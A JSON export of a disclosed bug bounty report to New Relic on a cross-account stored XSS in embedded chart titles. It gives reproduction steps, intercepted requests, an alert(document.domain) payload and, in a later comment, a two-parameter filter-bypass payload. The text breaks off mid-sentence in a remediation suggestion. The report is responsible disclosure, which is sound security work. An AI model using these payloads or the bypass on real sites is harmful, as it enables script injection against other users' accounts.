{"id":709883,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MDk4ODM=","url":"https://hackerone.com/reports/709883","title":"Cross-account stored XSS at embedded charts","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-10-08T16:27:33.884Z","submitted_at":"2019-10-08T16:27:33.884Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skavans","url":"/skavans","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17011,"url":"https://hackerone.com/newrelic","handle":"newrelic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"New Relic","twitter_handle":"newrelic","website":"https://newrelic.com","about":"New Relic's Coordinated Disclosure Program"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-13T13:47:26.691Z","bug_reporter_agreed_on_going_public_at":"2020-08-11T09:36:43.743Z","team_member_agreed_on_going_public_at":"2020-08-13T13:47:26.587Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey team,\n\nI've discovered one more stored XSS, this one is at the embedded chart page.\n\n##Steps tp reproduce\n1) Sign into NR, navigate to any Mobile app -\u003e Interactions\n2) Click `...` near any chart, then choose `Embed`. Select `OK` at the confirm box.\n3) Intercept the chart embedding POST request:\n```http\nPOST /accounts/2385914/embedded_charts.json HTTP/1.1\nHost: rpm.newrelic.com\n\u003credacted\u003e\n\nurl=/chart_data%2Fmetric_charts%2Fsingle_metric.json...\u003credacted\u003e\u0026chart_title=title\n```\n4) Change a `chart_title` parameter to `\u003c/script\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e` and send the changed request\n5) Navigate to Tools -\u003e Embedded charts, click `Show chart \u0026 embed code`\n6) Alert is popped up\n{F602612}\n7) Copy the `src` of iframe from embed code and navigate to it at the separate tab\n8) Alert is popped up again\n{F602613}\n\nWhat is pretty bad about this issue is that:\n- the XSS is cross-account, so attacker can attack other accounts' users;\n- the vulnerable page is build to be embeddable, so attacker can embed it into his own resource and **every user visiting his page will be attacked**.\n{F602615}\nLook at the address bar, this screenshot is from my own website. But the JS payload is executed inside your `rpm.newrelic.com` domain context because I embed the iframe to the vulnerable page at my site.\n\nThe issue lies inside the fact that you don't properly escape the chart title before injecting it inside script at embedded chart page (like https://rpm.newrelic.com/public/charts/jwBDr0K0WhZ):\n```html\n\u003cscript type='text/javascript'\u003e\n      jQuery(function($) {\n        var loadChart = function() {\n          $('#embedded-chart').highcharts({\n            height: '100%',\n            dataUrl: '/public/charts/jwBDr0K0WhZ/data.json',\n            render: true,\n            fluid: true,\n            loadingOverlay: true,\n            snappable: true,\n            chart_title: \"\u003c/script\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\",\n            liveChart: false,\n            dataApiUrl: '',\n            zoom_url: '',\n            dataApiField: '',\n            addToDashboard: true,\n            embeddable: true\n          });\n        };\n        jQuery.rpm.highcharts.registerRender(loadChart);\n      });\n    \u003c/script\u003e\n```\n\n## Impact\n\nCross-account embeddable through iframe stored XSS","bounty_amount":"3625.0","formatted_bounty":"$3,625","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":602612,"file_name":"______________2019-10-08___19.18.20.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nFwXSNPZg85Tjw4DeLrQig8m?response-content-disposition=attachment%3B%20filename%3D%22______________2019-10-08___19.18.20.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-10-08___19.18.20.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151923Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d1ea0388a6e05cdd8543fed1e7d209ddd10017e28e8ed045f4715371e39c8629","file_size":458779,"type":"image/png"},{"id":602613,"file_name":"______________2019-10-08___19.19.36.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dJR7hXtVAR6EUQeNDDMKrPSU?response-content-disposition=attachment%3B%20filename%3D%22______________2019-10-08___19.19.36.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-10-08___19.19.36.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151923Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=48d3ce75a49dc6f75b494492dedb9a23fa1f97119e53f58e5e036c3e749c217c","file_size":143511,"type":"image/png"},{"id":602615,"file_name":"______________2019-10-08___19.23.11.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8DKKrJFMqLT5gfkekMjmXeKL?response-content-disposition=attachment%3B%20filename%3D%22______________2019-10-08___19.23.11.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-10-08___19.23.11.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151923Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2af8791de1e93cb90e53309afa1cae67f6cb447d2390c612ad05c108f867de60","file_size":174201,"type":"image/png"}],"allow_singular_disclosure_at":"2020-09-10T09:36:43.782Z","allow_singular_disclosure_after":-34234959.555461556,"singular_disclosure_allowed":true,"vote_count":154,"voters":["wi11","dninjadave","ashbi","oucast-","msultan","mashoud1122","newbipath12","bogdantcaciuc","danila","spam404","and 144 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":18678,"asset_type":"URL","asset_identifier":"rpm.newrelic.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5987817,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For example, if attacker has a resource with 10k visits per day, he can embed iframe referring to vulnerable page inside it, and if any of his visitors are your clients too, them all will be attacked with no navigating to NR itself at all. **So the impact is quite severe.**","automated_response":false,"created_at":"2019-10-08T16:34:46.924Z","updated_at":"2019-10-08T16:34:46.924Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6004200,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @skavans,\n\nThanks for bringing this to our attention. I'm currently working to try and reproduce this.\n\nIf I need any further info I will reach out to you for further details.\n\nThanks,\nJoe","automated_response":false,"created_at":"2019-10-10T13:56:18.034Z","updated_at":"2019-10-10T13:56:18.034Z","actor":{"username":"jmcevoy","cleared":false,"url":"/jmcevoy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6004294,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @jmcevoy,\n\nyou can use any app's (e.g. APM one) chart, which could be `embedded`, to reproduce this, not a Mobile only.","automated_response":false,"created_at":"2019-10-10T14:06:24.558Z","updated_at":"2019-10-10T14:06:24.558Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6004867,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @skavans,\n\nThank you for the additional information.\n\nI have been able to reproduce this on my side and have logged the issue with the responsible team for resolution.\n\nThank you for helping to make New Relic safer!","automated_response":false,"created_at":"2019-10-10T15:14:59.013Z","updated_at":"2019-10-10T15:14:59.013Z","actor":{"username":"jmcevoy","cleared":false,"url":"/jmcevoy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6006454,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jmcevoy, and what’s about the bounty? :)","automated_response":false,"created_at":"2019-10-10T18:54:51.540Z","updated_at":"2019-10-10T18:54:51.540Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6019013,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Guys, don’t you pay at triage from now? Or the severity is still under discussion?","automated_response":false,"created_at":"2019-10-11T21:15:55.973Z","updated_at":"2019-10-11T21:15:55.973Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6036213,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @skavans ,\n\nWe do our best to award at Triage, but we are handling some things internally at the moment. We'll do our best to pay you in the next couple of days. Please hang tight!","automated_response":false,"created_at":"2019-10-14T16:36:31.081Z","updated_at":"2019-10-14T16:36:31.081Z","actor":{"username":"dday","cleared":false,"url":"/dday","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/290/656/1ef18673ce65d82a0c72315185fac6be67c06f0a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6067424,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-10-17T18:51:53.270Z","updated_at":"2019-10-17T18:51:53.270Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"skavans","url":"/skavans"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6068337,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@dday Thanks for the bounty!","automated_response":false,"created_at":"2019-10-17T20:50:34.970Z","updated_at":"2019-10-17T20:50:34.970Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6106455,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @skavans,\n\nThank you again for your report.\n\nWe've marked #716667 as a duplicate as it represents the same root cause as what you've found here. Namely, no sanitization on user input for new charts. As you discovered, a similar issue appears in #710535. We've triaged that separately as sanitization of notes takes place in another spot.\n\nAs thanks for your work, we'll be awarding a bonus here as this was initially resolved internally but it was not completely remediated by the team.","automated_response":false,"created_at":"2019-10-22T14:15:48.838Z","updated_at":"2019-10-22T14:15:48.838Z","actor":{"username":"dmcmahon","cleared":false,"url":"/dmcmahon","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6106460,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-10-22T14:16:31.145Z","updated_at":"2019-10-22T14:16:31.145Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"500.0","genius_execution_id":null,"team_handle":"newrelic","collaborator":{"username":"skavans","url":"/skavans"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6197562,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"{F623556}","automated_response":false,"created_at":"2019-11-02T01:15:20.991Z","updated_at":"2019-11-02T01:15:20.991Z","actor":{"username":"ahamlin","cleared":false,"url":"/ahamlin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skavans","url":"/skavans"},"attachments":[{"id":623556,"filename":"anotherOneBitesTheDust2.gif","type":"image/gif","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1gCehLi2BkyEhSsF2EQX7UY2?response-content-disposition=attachment%3B%20filename%3D%22anotherOneBitesTheDust2.gif%22%3B%20filename%2A%3DUTF-8%27%27anotherOneBitesTheDust2.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151923Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=23993063f210dd6ee4bbb239fec238347fe9412d74165b6a7f75161c1cb62668"}],"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6199010,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey guys,\n\nI have found a bit non-trivial fix bypass for both this and #716667 duplicate issue.\n\nThe fix you've implemented here is stripping the tags from `chart_title`. So I was unsuccessful with trying to directly inject a payload which closes your `script` tag to execute my malicious payload instead. Thus, if I inject the `\u003c/script\u003easd` it transforms to just `asd`.\n\nBut I found that when I try to inject some unfinished tag like `\u003c/script`, the stripping doesn't work. The next my try was to found a way to start a tag at one place, and to finish it at another one. This is where the map embedding issue #716667 (which is marked as a duplicate of this one) and its vulnerable parameter `chart_type` come into the play.\n\nThe `chart_type` parameter of map embedding request (which is reflected in the `swf` chart parameter of embedded map page) is protected using the same stripping tags technique, so I can't just close your `script` inside it too. But I thought: what if I combine them together?\n\nBy default, the map embedded chart (which is an object of #716667) doesn't contain title. But I tried to add the parameter `chart_title` into an map embedding request and got the following interesting result at embedded chart page:\n```html\n\u003cscript type=\"text/javascript\"\u003e\n      jQuery.rpm.chart.registerRender( function () {$('#div_embedded-chart').chart({\"swf\":\"WorldwithCountries\",\"width\":\"100%\",\"height\":\"100%\",\"dataUrl\":\"/public/charts/cG0tUsOCiVk/data.xml\",\"title\":\"MY_CHART_TITLE\",\"render\":true});} );\n    \u003c/script\u003e\n```\nAs you can see, there is a chart parameter `title` containing the title I submitted. So here we got **two** injection points and can craft the payload which bypasses your implemented fix.\n\n##Steps to reproduce:\n1) Sign into NR, navigate to any Mobile app (you can even create a new empty one, no data inside is needed)\n2) Navigate to `Network` -\u003e `Geography`\n3) Move mouse over the Countries map, then click the + at the bottom of the map\n4) Select `Embed` and click `OK`\n5) Intercept a request with Burp, it is like the following:\n```http\nPOST /accounts/2385914/embedded_charts.json HTTP/1.1\nHost: rpm.newrelic.com\n\u003credacted\u003e\n\nurl=%2Fchart_data%2Fmetric_charts%2Fmobile_response_time_map.xml%3Faccount_id%3D2385914%26agent%3D194687300%26application_id%3D194687300%26chart_fun%3Dworld%2Bapdex%26chart_type%3DWorldwithCountries%26current_product%3Dmobile_product%26escape%3Dfalse%26maplegend%3Dtrue%26overview%3Dfalse%26path_only%3Dtrue%26sort_by%3DLaunches%26tw%255Bsince%255D%3D7776000\n```\n6) Replace the `WorldwithCountries` inside an `url` parameter to \nWorldwith\u003c/script%20a=`Countries\n7) Add an extra parameter \"chart_title\" into a tail of payload with the following value:\n`\u003e\u003csvg onload=alert(document.domain)//\nSo your final request should looks like the following:\n```http\nPOST /accounts/2385914/embedded_charts.json HTTP/1.1\nHost: rpm.newrelic.com\n\u003credacted\u003e\n\nurl=%2Fchart_data%2Fmetric_charts%2Fmobile_response_time_map.xml%3Faccount_id%3D2385914%26agent%3D194687300%26application_id%3D194687300%26chart_fun%3Dworld%2Bapdex%26chart_type%3DWorldwith\u003c/script%20a=`Countries%26current_product%3Dmobile_product%26escape%3Dfalse%26maplegend%3Dtrue%26overview%3Dfalse%26path_only%3Dtrue%26sort_by%3DLaunches%26tw%255Bsince%255D%3D7776000\u0026chart_title=`\u003e\u003csvg onload=alert(document.domain)//\n```\n8) Send request\n9) Navigate to `Tools` -\u003e `Embedded charts`, click `Show chart \u0026 embed code` near the top line\n10) Make sure the payload is executed:\n{F623719}\n\nIf you inspect the embedded map page, you will see the following:\n{F623723}\n\n##Remediation\nI suggest you to use HTML-entities encoding of user-input value rather than strippers, because it is more reliable to restrict all potentially dangerous symbols instead of try to defeat all dodgy filter bypasses.\n\nPlease feel free to reach me if you need some assistance in understanding or remediating the 